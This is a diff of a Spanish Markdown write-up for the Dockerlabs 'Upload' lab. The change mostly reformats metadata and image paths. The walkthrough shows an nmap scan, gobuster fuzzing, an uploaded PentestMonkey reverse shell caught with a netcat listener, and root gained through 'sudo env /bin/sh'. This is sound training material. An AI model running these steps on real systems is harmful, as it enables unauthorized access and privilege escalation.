@@ -1,13 +1,6 @@
 # Upload
 
-Plataforma: Dockerlabs
-OS: Linux
-Level: Very Easy
-Status: Done
-Complete: Yes
-EJPT: yes
-Created time: 4 de diciembre de 2024 21:01
-IP: 172.17.0.2
+Plataforma: Dockerlabs OS: Linux Level: Very Easy Status: Done Complete: Yes EJPT: yes Created time: 4 de diciembre de 2024 21:01 IP: 172.17.0.2
 
 ## Recopilación de información
 
@@ -15,7 +8,7 @@ IP: 172.17.0.2
 
 Comenzamos con un escaneo para identificar que puertos están abiertos.
 
----
+***
 
 ```bash
 sudo nmap -p-  --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allports
@@ -27,26 +20,26 @@ Open port: 80
 
 Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.
 
----
+***
 
-- **Identificación de vulnerabilidades**
-    - 80 / HTTP
-    
+*   **Identificación de vulnerabilidades**
+
+    * 80 / HTTP
+
     Whatweb :
-    
-    ![image.png](/images/DockerLabs/image.png)
-    
-    Fuzzing : 
-    
+
+    ![image.png](../../.gitbook/assets/image.png)
+
+    Fuzzing :
+
     ```bash
     gobuster dir -u 172.17.0.2 -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -x txt,php
-    
-    ```
-    
-    ![image.png](/images/DockerLabs/image%201.png)
-    
 
-![image.png](/images/DockerLabs/image%202.png)
+    ```
+
+    ![image.png](<../../.gitbook/assets/image 1.png>)
+
+![image.png](<../../.gitbook/assets/image 2.png>)
 
 ## Explotación
 
@@ -58,7 +51,7 @@ Upload reverse shell PentestMonkey via web
 sudo nc -lvnp 443
 ```
 
-![image.png](/images/DockerLabs/image%203.png)
+![image.png](<../../.gitbook/assets/image 3.png>)
 
 ### Explotación posterior
 
@@ -70,7 +63,7 @@ Buscamos binarios SUID:
 sudo -l
 ```
 
-![image.png](/images/DockerLabs/image%204.png)
+![image.png](<../../.gitbook/assets/image 4.png>)
 
 Buscamos en GTFOBins como explotar el binario “env”
 
@@ -78,7 +71,7 @@ Buscamos en GTFOBins como explotar el binario “env”
 sudo env /bin/sh
 ```
 
-![image.png](/images/DockerLabs/image%205.png)
+![image.png](<../../.gitbook/assets/image 5.png>)
 
 ## Conclusión
 
